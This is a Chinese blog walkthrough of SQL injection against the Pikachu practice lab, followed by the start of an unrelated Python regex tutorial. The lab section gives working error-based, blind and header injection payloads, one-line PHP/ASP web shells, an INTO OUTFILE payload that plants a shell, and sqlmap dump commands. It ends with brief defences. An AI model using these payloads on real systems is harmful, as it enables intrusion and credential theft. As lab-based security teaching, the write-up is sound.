<p>Xpath定位必须是有效的，否则会发生错误。</p>
<p><strong>Select下报错的利用：</strong><br>我们还是打开字符型注入，首先判断有没有报错，会不会在前端显示，我们输入单引号发现有注入报错。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-46-09.png" alt="单引号出错" class="lazyload"><br>现在构造一个报错：<code>a&#39; and updatexml(1,version(),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-48-33.png" alt="构造语句测试" class="lazyload"><br>出现.26，并没有把对应的版本号爆出来，现在对语句修改：<br><code>a&#39; and updatexml(1,concat(0x7e,version()),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-52-22.png" alt="成功获取到版本" class="lazyload"><br>成功获取到版本号，我们可以把version替换成任意我们想要获得的东西<br><code>a&#39; and updatexml(1,concat(0x7e,database()),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-54-29.png" alt="获取数据库名" class="lazyload"><br>获取到数据库名，进行进一步查询<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39;)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-56-37.png" alt="尝试查表名" class="lazyload"><br>报错返回数据多余一行，说明报错有多行。可以使用limityici一次获取表名信息<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-18-59-43.png" alt="获取表名" class="lazyload"><br>我们可以得到第一个表名。想要得到第二个表名只要把limit后边的第一个0改成1即可。依此类推，可以得到所有表名。到第三个的时候获取到user表名<br><code>a&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 3,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-04-25.png" alt="user表名获取" class="lazyload"><br>在获取表名之后，思路一样，获取列名<br><code>a&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-07-27.png" alt="获取列名" class="lazyload"><br>同样的依此类推得到所有列名后再来获取数据<br><code>a&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-09-29.png" alt="数据" class="lazyload"><br>获取了第一个用户名，再根据用户名查询密码<br><code>a&#39; and updatexml(1,concat(0x7e,(select password from users where username=&#39;admin&#39; limit 0,1)),0)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-10-49.png" alt="密码" class="lazyload"><br>获取到md5加密的密文，在网站中撞库解密密文获取明文密码。</p>
<p><strong>insert/update注入利用</strong><br>我们打开靶场点击注册<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-15-23.png" alt="注册" class="lazyload"><br>一样的方法判断是否有注入漏洞加个单引号看是否报错<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-38-14.png" alt="判断注入点" class="lazyload"><br>经判断存在sql注入漏洞，重点是如何利用，如何构造闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">用户名输入: a&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;<br></code></pre></td></tr></table></figure>

<p>密码随便输，点击提交<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-39-28.png" alt="注入成功" class="lazyload"><br>成功得到数据库名。思路一样将database做替换，得到想要的信息<br>update与insert是一模一样的，我们先登录用户。<br>在这里可能会有人显示不出来信息，可以参考解决方案。<br>在使用pikachu的时候发现一点问题，好像是由php版本较高导致的不兼容，如图：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-44-06.png" alt="报错" class="lazyload"><br>在这里我们打开这个路径，找到第70行，把MYSQL_ASSOC改成MYSQLI_ASSOC，保存文件，刷新网页。就可以啦。<br>原因：在php7中，MYSQL_ASSOC不再是一个常量，将 MYSQL_ASSOC改为MYSQLI_ASSOC，意思是mysqli的方式提取数组，而不再是mysql 。（原因：mysql_fetch_arrayhan函数转为mysqli_fetch_array，参数没有修改）<br>修改后恢复正常<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-19-48-46.png" alt="问题解决" class="lazyload"><br>尝试注入的流程<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-01-52.png" alt="更新注入流程" class="lazyload"><br>爆出数据库名称，之后逻辑就一样了。</p>
<p><strong>delete注入利用</strong><br>打开delete注入靶场，添加几条评论<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-17-31.png" alt="打开靶场" class="lazyload"><br>点击删除留言，留言被删除，我们打开burp查看抓到的数据包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-20-13.png" alt="数据包" class="lazyload"><br>将数据包发送到repeater模块中，get后边的id可以注入，构成闭合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1 or updatexml(1,concat(0x7e,database()),0)<br></code></pre></td></tr></table></figure>

<p>数据包修改操作<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-29-23.png" alt="改包" class="lazyload"><br>点击go执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-30-22.png" alt="执行" class="lazyload"><br>出现数据库名，剩下的操作就是更换database获取信息</p>
<p><strong>extractvalue()</strong><br>extractvalue()函数作用:从目标XML中返回包含所查询值的字符串。<br>语法: ExtractValue(xml _document, xpath. string)</p>
<ul>
<li>第一个参数：xml _document是string格式，为xml文档对象的名称，文中为Doc</li>
<li>第二个参数：xpath. string(xpath格式的字符串)</li>
</ul>
<p>Xpath定位必须是有效的,否则会发生错误。<br>打开字符型注入，输入payload:<code>kobe&#39; and extractvalue(0,concat(0x7e,version()))#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-35-16.png" alt="执行" class="lazyload"><br>效果差不多</p>
<p><strong>floor()</strong><br>字符型中输入payload：<code>kobe&#39; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-37-26.png" alt="效果" class="lazyload"><br>原理都差不多都是报错显示信息，区别是使用的函数也不一样，构造的语句也不同</p>
<h5 id="SQL注入漏洞-基于http-header的注入"><a href="#SQL注入漏洞-基于http-header的注入" class="headerlink" title="SQL注入漏洞-基于http header的注入"></a>SQL注入漏洞-基于http header的注入</h5><p>什么是http header注入：后台开发人员为了验证客户端头信息(比如常用的cookie验证)或者通过http header头信息获取客户端的一些信息，比如useragent、accept字段等等。会对客户端的http header信息进行获取并使用SQL进行处理,如果此时没有足够的安全考虑，则可能会导致基于http header的SQL Inject漏洞。<br>漏洞演示：<br>打开靶场点击提示获得账号密码登录<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-43-35.png" alt="登录" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-45-48.png" alt="登录后页面" class="lazyload"><br>可以看到http头信息展示到了前端页面，说明后台对http头数据进行了获取，进行了数据库操作，打开burp的数据包发送到repeater中进行测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-55-27.png" alt="寻找注入" class="lazyload"><br>找到注入我们输入payload：<code>firefox&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-20-57-26.png" alt="利用成功" class="lazyload"><br>返回了数据库名称</p>
<h5 id="SQL注入漏洞-盲注"><a href="#SQL注入漏洞-盲注" class="headerlink" title="SQL注入漏洞-盲注"></a>SQL注入漏洞-盲注</h5><p>什么是盲注？<br>在有些情况下,后台使用了错误消息屏蔽方法(比如@ )屏蔽了报错<br>此时无法在根据报错信息来进行注入的判断。这种情况下的注入，称为“盲注”根据表现形式的不同，盲注又分为based boolean和based time两种类型</p>
<p><strong>基于boolean的盲注</strong><br>表现症状：</p>
<ol>
<li>没有报错信息</li>
<li>不管正确输入还是错误输入都只显示0或1</li>
<li>在正确的输入下，输入 and 1=1 或者 and 1=2 发现可以判断</li>
</ol>
<p>测试演示：<br>打开boolean盲注，输入<code>kobe&#39; and 1=1#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-07-30.png" alt="流程" class="lazyload"><br>对比说明存在sql注入漏洞，我们尝试之前的方法发现都行不通<br>只能重新构造语句<code>kobe&#39; and ascii(substr(database(),1,1))&gt;113#</code><br>查询显示不存在<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-10-52.png" alt="查询" class="lazyload"><br>修改大于号后边的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-24-38.png" alt="修改" class="lazyload"><br>一次修改猜第二个字符的语句为<code>kobe&#39; and ascii(substr(database(),2,1))&gt;105#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-13-21-28-44.png" alt="第二个字符" class="lazyload"><br>只能一个一个试出来，这样思路就有了。</p>
<p><strong>基于timebase的盲注</strong><br>如果说基于boolean的窗注在页面上还可以看到0 or 1的回显的话那么基于time的盲注完全就啥都看不到了!但还有一个条件，就是“时间”， 通过特定的输入，判断后台执行的时间,从而确认注入!<br>常用的teat payload：<code>kobe’ and sleep(5)#</code><br>打开基于时间的盲注靶场输入kobe和payload查看区别，从而判断这里存在basedtime sql inject<br>输入单引号查看时无反应，进行其他尝试也是无反应，然后输入时间盲注的payload查看结果<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-51-43.png" alt="验证时间盲注" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-09-56-04.png" alt="数据包分析" class="lazyload"><br>可以看到有一个请求有5毫秒多的延时说明我们的payload中的延时函数成功执行。<br>我们构造一个payload来猜解出数据库构造语句<code>kobe&#39; and if((substr(database(),1,1))=&#39;p&#39;,sleep(5),null)#</code>意思是如果数库名的第一个字符等于p时延时5秒否则不延时，网页返回时间有延时说明第一个字符是p，不延时则不是p，然后思路就和布尔盲注的思路一样猜解、替换database</p>
<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>一句话木马：是一种短小而精悍的木马客户端，隐蔽性好，功能强大<br>php的一句话：<code>&lt; ?php @eval($_ POST&#39;chopper&#39;]);?&gt;</code><br>asp的一句话：<code>&lt; %eval request(&quot;chopper&quot;)%&gt;</code><br>asp.net的一句话：<code>&lt;%@ Page Language= Jscript” %&gt; &lt;%eval(Request.Item[&quot;chopper&quot;]), “unsafe );%&gt;</code></p>
<p>select 1,2 into outfile “/var/www/html/1.txt”<br>into outfile 将select的结果写入到指定的目录的1.txt</p>
<p>在没有回显的注入中可以使用into outfile将一句话写入到文件然后获取权限，前提：</p>
<ol>
<li>需要知道远程目录</li>
<li>需要远程目录有写入权限</li>
<li>需要数据库开启secure_file_priv</li>
</ol>
<p>字符型注入写入一句话木马获取权限：<br>payload：<code>kobe&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;C:/phpstudy_pro/WWW/pikachu/3.php&quot;#</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-11-18.png" alt="流程" class="lazyload"><br>将一句话写入到目录下的3.php,用工具链接即可获取权限。</p>
<h5 id="SQL-Inject漏洞之表-列-名的暴力破解"><a href="#SQL-Inject漏洞之表-列-名的暴力破解" class="headerlink" title="SQL Inject漏洞之表(列)名的暴力破解"></a>SQL Inject漏洞之表(列)名的暴力破解</h5><p>打开字符型注，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">kobe&#x27; and exists(select * from aa)#<br>kobe&#x27; and exists(select id from users)#<br></code></pre></td></tr></table></figure>

<p>判断是否存在aa表，判断是否存在id在users表中<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-15-35.png" alt="测试语句" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-17-43.png" alt="测试语句" class="lazyload"><br>可以看到第一个没有表，第二个成功返回页面信息，我们抓包，进行暴破表名：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-11-38-56.png" alt="暴破注入" class="lazyload"><br>同样的我们也可以用第二个payload暴破猜出列名。</p>
<h5 id="自动化注入攻击-SQL-MAP进行sql-inject攻击"><a href="#自动化注入攻击-SQL-MAP进行sql-inject攻击" class="headerlink" title="自动化注入攻击(SQL-MAP进行sql inject攻击)"></a>自动化注入攻击(SQL-MAP进行sql inject攻击)</h5><p>可以直接在官网下载压缩包：<br>sqlmap的经典用法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">1. python sqlmap.py -u &quot;url&quot; --cookie=&quot;yy&quot; #带上cookie对url进行注入探测<br>2. python sqlmap.py -u &quot;url&quot; --current-db #获取当前数据库名称<br>3. python sqlmap.py -u &quot;url&quot; --tables -D &quot;数据库名&quot; #列表名<br>4. python sqlmap.py -u &quot;url&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot; -v 0 #列字段<br>5. python sqlmap.py -u &quot;url&quot; --dump -C &quot;字段名&quot; -T &quot;表名&quot; -D &quot;数据库&quot; -v 0 #获取字段内容<br>-r 文件名 #这种可以指定文件，用法用burp抓个包将数据包存为文件并在注入点出加一个*做标记<br></code></pre></td></tr></table></figure>

<p>-v x 参数介绍<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-13-18-19.png" alt="参数介绍" class="lazyload"></p>
<h5 id="SQL注入漏洞的常见防护措施"><a href="#SQL注入漏洞的常见防护措施" class="headerlink" title="SQL注入漏洞的常见防护措施"></a>SQL注入漏洞的常见防护措施</h5><p><strong>代码层面的防护：</strong></p>
<ol>
<li>对输入进行严格的转义和过滤</li>
<li>使用预处理和参数化(Parameterized)</li>
</ol>
<p><strong>网络层面：</strong></p>
<ol>
<li>通过waf设备启用防SQL注入策略或类似防护系统</li>
<li>云端防护(360网站卫士或阿里云盾)</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-14-40.png" alt="加waf" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/06/pikachu%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%AD%A6%E4%B9%A0/2023-03-14-12-15-39.png" alt="加云端防护" class="lazyload"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>视频学习教程：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1KY4y1u7nk?p=2">https://www.bilibili.com/video/BV1KY4y1u7nk?p=2</a><br>pikachu场资源：<a target="_blank" rel="noopener" href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>参考学习：<a target="_blank" rel="noopener" href="https://www.fkqq.fun/2022/07/11/pikachu/">https://www.fkqq.fun/2022/07/11/pikachu/</a></p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="python学习使用正则表达式" class="lazyload">
                    <h1>python学习使用正则表达式</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2021年10月25日</a>
            <a><i class="nexmoefont icon-areachart"></i>2.5k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
        </div>

        <article>
            
                <h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><p>又称规则表达式，是处理字符串的有力工具，是对字符串操作的一种逻辑公式。</p>
<p>本质：使用事先定义好的一些特定字符组成的“规则字符串”的一种过滤逻辑</p>
<p>规则字符串：包括普通字符（如：a~z之间的英文字母，数字）和特殊字符（称为“元字符”)</p>
<p>例：</p>
<figure class="highlight r"><table><tr><td class="code"><pre><code class="hljs R"><span class="hljs-string">&quot;0\d&#123;2,3&#125;-\d&#123;7,8&#125;&quot;</span>包括普通数字和匹配数字的元字符<span class="hljs-string">&quot;\d&quot;</span>可以过滤或提取字符串中包含的固定电话号码，如：<span class="hljs-number">000</span>-<span class="hljs-number">00000000</span><br></code></pre></td></tr></table></figure>

<p>与python中提供的字符出处理函数相比，正则表达式提供了更强大的处理功能，可以快速、准确地完成复杂的查找、替换等处理任务，其逻辑性、灵活性、功能性强，而且能极简单的方式实现字符串的复杂控制</p>
<p>正则表达式处理字符过程：</p>
<ol>
<li><p>编写正则表达式</p>
</li>
<li><p>使用正则表达式引擎对正则表达式进行编译，得到正则表达式对象</p>
</li>
<li><p>通过正则表达式对象对字符串进行匹配或过滤，得到匹配的结果</p>
<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1.jpg"></p>
</li>
</ol>
<p>例：正则表达式提取字符串中的日期</p>
<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/2.jpg"></p>
<h1 id="正则表达式语法："><a href="#正则表达式语法：" class="headerlink" title="正则表达式语法："></a>正则表达式语法：</h1><h2 id="正则表达式组成："><a href="#正则表达式组成：" class="headerlink" title="正则表达式组成："></a>正则表达式组成：</h2><ol>
<li><p>正则表达式的构造方法和数学表达式的构造方法一样，使用多种元字符和运算符组合在一起创建一个表达式，组成表达式的可以是单字符，字符集合，字符范围、字符间的选择或者它们之间的任意组合</p>
<ul>
<li><p>普通字符：</p>
<p>正则表达式中的普通字符：</p>
<ol>
<li>英文字母：26个大小写英文字母共52个</li>
<li>汉字：Unicode字符集中包括的汉字</li>
<li>数字：0~9共十个数字</li>
<li>标点符号：如：”:” “,”等</li>
<li>其他符号：如：”\n（换行符）”\t（制表符）”等非打印字符</li>
</ol>
</li>
<li><p>特殊字符：</p>
<p>有特殊含义的字符，特殊字符一般具有通用性：</p>
<h3 id="字符匹配模式："><a href="#字符匹配模式：" class="headerlink" title="字符匹配模式："></a>字符匹配模式：</h3><table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">匹配除换行符(\n)外的任意单个字符</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">表示位于\之后的为转义字符</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">匹配位于|之前或之后的字符</td>
</tr>
<tr>
<td align="center">[]</td>
<td align="center">匹配位于[]中的任意一个字符</td>
</tr>
<tr>
<td align="center">[a-b]或[abc]</td>
<td align="center">匹配指定范围的任何字符</td>
</tr>
<tr>
<td align="center">[^a-c]或[^abc]</td>
<td align="center">匹配指定范围外的任何字符</td>
</tr>
<tr>
<td align="center">()</td>
<td align="center">将()中的内容作为一个整体对待</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">匹配一位数字</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="center">与\d刚好相反</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">匹配一位数字、字母、下划线</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="center">匹配一位空白字符：&lt;空格&gt;，\t,\n,\r,\f,\v</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="center">与\s相反</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="center">与\w相反</td>
</tr>
</tbody></table>
<h3 id="定位符："><a href="#定位符：" class="headerlink" title="定位符："></a>定位符：</h3><table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">^</td>
<td align="center">匹配以^后面的字符或模式开头的字符串</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">匹配以$前面的字符或模式结束的字符串</td>
</tr>
<tr>
<td align="center">\b</td>
<td align="center">匹配单词头或单词尾</td>
</tr>
<tr>
<td align="center">\B</td>
<td align="center">与\b相反</td>
</tr>
</tbody></table>
<h3 id="限定符："><a href="#限定符：" class="headerlink" title="限定符："></a>限定符：</h3><table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">*</td>
<td align="center">匹配*前一个字符出现0次或多次</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">匹配+前一个字符出现一次或多次</td>
</tr>
<tr>
<td align="center">？</td>
<td align="center">匹配？前一个字符只能出现一次或0次</td>
</tr>
<tr>
<td align="center">{m}</td>
<td align="center">匹配前一个字符只能出现m次</td>
</tr>
<tr>
<td align="center">{m,}</td>
<td align="center">匹配前一个字符出现至少m次</td>
</tr>
<tr>
<td align="center">{m,n}</td>
<td align="center">匹配前一个字符至少出现m~n次</td>
</tr>
</tbody></table>
<h3 id="扩展语法："><a href="#扩展语法：" class="headerlink" title="扩展语法："></a>扩展语法：</h3></li>
</ul>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">（?#pattern）</td>
<td align="center">表示注释</td>
</tr>
<tr>
<td align="center">(?:pattern)</td>
<td align="center">匹配但不捕获该匹配的子模式</td>
</tr>
<tr>
<td align="center">(?=pattern)</td>
<td align="center">用于正则表达式之后，如果=后的内容在字符串中出现则匹配，但不返回=之后的内容</td>
</tr>
<tr>
<td align="center">(?!pattern)</td>
<td align="center">用于正则表达式之后，如果!之后的内容在字符串中不出现则匹配，但不返!之后的内容</td>
</tr>
<tr>
<td align="center">(?&lt;=pattern)</td>
<td align="center">用于正则表达式之前，如果&lt;=后的内容在字符串中出现则匹配，但不返回&lt;=之后的内容</td>
</tr>
<tr>
<td align="center">(?&lt;!pattern)</td>
<td align="center">用于正则表达式之前，如果&lt;!后的内容在字符串中不出现则匹配，但不返回&lt;!的内容</td>
</tr>
</tbody></table>
<h3 id="贪婪模式与非贪婪模式："><a href="#贪婪模式与非贪婪模式：" class="headerlink" title="贪婪模式与非贪婪模式："></a>贪婪模式与非贪婪模式：</h3><p>贪婪模式与非贪婪模式影响的是被量词修饰的子表达式的匹配行为</p>
<p>贪婪模式：在整个表达式匹配成功的前提下尽可能多的匹配</p>
<p>非贪婪模式：在整个表达式匹配成功的前提下，尽可能少的匹配</p>
<p>默认贪婪模式，在量词后面直接加上一个”？“就是非贪婪模式</p>
<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/3.jpg"></p>
<p>字符串的贪婪模式与非贪婪模式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&lt;div&gt;监督学习&lt;/div&gt;&lt;div&gt;非监督学西&lt;/div&gt;&lt;div&gt;半监督学习&lt;/div&gt;&quot;</span><br>pat1=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div&gt;.*&lt;/div&gt;&#x27;</span>)<br>res1=pat1.findall(<span class="hljs-built_in">str</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;贪婪匹配：&quot;</span>,res1)<br>pat2=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div&gt;.*?&lt;/div&gt;&#x27;</span>)<br>res2=pat2.findall(<span class="hljs-built_in">str</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;非贪婪匹配：&quot;</span>,res2)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/25/python%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/4.jpg"></p>
<h1 id="使用正则表达式模块处理字符串"><a href="#使用正则表达式模块处理字符串" class="headerlink" title="使用正则表达式模块处理字符串"></a>使用正则表达式模块处理字符串</h1><p>使用标准库Re模块可以使用正则表达式全部功能：</p>
<ol>
<li>直接调用re模块中的函数</li>
<li>将正则表达式编译程成正则表达对象后再调用表达式对象中的函数、</li>
</ol>
<h2 id="re模块中常用的函数："><a href="#re模块中常用的函数：" class="headerlink" title="re模块中常用的函数："></a>re模块中常用的函数：</h2><h3 id="匹配函数："><a href="#匹配函数：" class="headerlink" title="匹配函数："></a>匹配函数：</h3><p>1、res=re.match(pattern, str,flags=0):功能是尝试从字符串的起使位置匹配一个模式，若匹配成功则返回一个匹配对象，否则返回None。pattern为正则表达式，str为匹配字符串，flags是可选标志位，用于控制正则表达式匹配方式，如区分大小写，多行匹配等。</p>
<p>正则表达式常用标志位：</p>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
